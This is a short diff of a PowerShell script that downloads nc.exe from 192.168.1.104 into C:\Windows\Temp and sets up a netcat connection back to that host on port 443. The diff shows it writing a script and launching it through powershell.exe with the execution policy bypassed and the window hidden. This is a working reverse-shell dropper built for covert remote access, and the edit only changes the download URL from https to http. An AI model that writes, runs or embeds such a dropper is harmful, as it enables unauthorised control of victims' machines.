@@ -1,5 +1,5 @@
 # Define variable
-$ncUrl = "https://192.168.1.104:80/nc.exe"
+$ncUrl = "http://192.168.1.104:80/nc.exe"
 $ncPath = "C:\Windows\Temp\nc.exe"
 $ncCommand = "C:\Windows\Temp\nc.exe 192.168.1.104 443"
 
@@ -15,4 +15,5 @@ Remove-Item -Path '$ScriptPath' -Force
 Set-Content -Path $ScriptPath -Value $ScriptContent
 
 # Run the script
+
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $ScriptPath" -WindowStyle Hidden
